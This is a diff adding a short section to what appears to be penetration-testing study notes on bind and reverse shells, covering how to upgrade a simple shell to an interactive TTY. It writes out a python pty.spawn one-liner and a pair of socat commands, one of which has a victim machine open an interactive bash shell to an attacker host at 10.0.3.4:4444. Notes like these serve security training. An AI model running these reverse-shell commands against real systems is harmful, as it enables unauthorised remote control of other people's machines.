@@ -36,3 +36,18 @@ There are two ways to access a shell (bind shell and reverse shell)
 ### Shell Codes
   Describe code executed by a target program due to a vulnerability exploit and used to open a remote shell 
   
+
+### Upgrading Simple Shells to Fully Interactive TTYs
+using python
+  onvictim:
+    python -c 'import pty; pty.spawn("/bin/bash")'
+    
+ using socat:
+ on host(attacker):
+  socat file:`tty`,raw,echo=0 tcp-listen:4444
+ on victim :
+  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+  
+    
+    
+  
